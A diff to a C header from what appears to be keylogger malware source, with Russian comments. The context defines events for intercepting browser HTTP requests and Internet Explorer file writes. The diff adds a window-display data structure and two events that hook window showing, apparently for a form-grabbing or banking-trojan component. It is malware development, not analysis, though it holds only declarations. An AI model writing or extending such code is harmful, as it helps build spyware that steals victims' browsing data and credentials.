@@ -290,6 +290,15 @@ typedef struct THTTPRequestData
 
 }*PHTTPRequestData;
 
+
+// Информация о отображаемом окне
+typedef struct TShowWindowData
+{
+	HWND Window;
+	int Command;
+} *PShowWindowData;
+
+
 // ****************************************************************************
 // Типы и объявления событий кейлогера
 // ****************************************************************************
@@ -304,6 +313,9 @@ typedef void(WINAPI * TKeyLoggerEventHandler)(PKeyLogger Logger, DWORD EventID,
 #define KLE_SEND_HTTP_REQUEST   3 /* Браузер отправляет запрос на сайт. Data = PHTTPRequestData */
 #define KLE_INTERNET_WRITE_FILE 4 /* IE считывает файл с помощью InternetWriteFile. Data = PHTTPRequestData */
 #define KLE_ADD_TEXT_LOG        5 /* Добавляется текстовый лог. Data = PCHAR */
+#define KLE_SHOW_WND            6 /* Событие вызывается перед вызовом функции отображения окна. Data = PShowWindowData */
+#define KLE_AFTER_SHOW_WND      7 /* Событие вызывается после вызова функции отображения окна  Data = PShowWindowData */
+
 // ****************************************************************************
 // KeyLogger - методы для организации работы кейлогера и работы с ним
 // ****************************************************************************
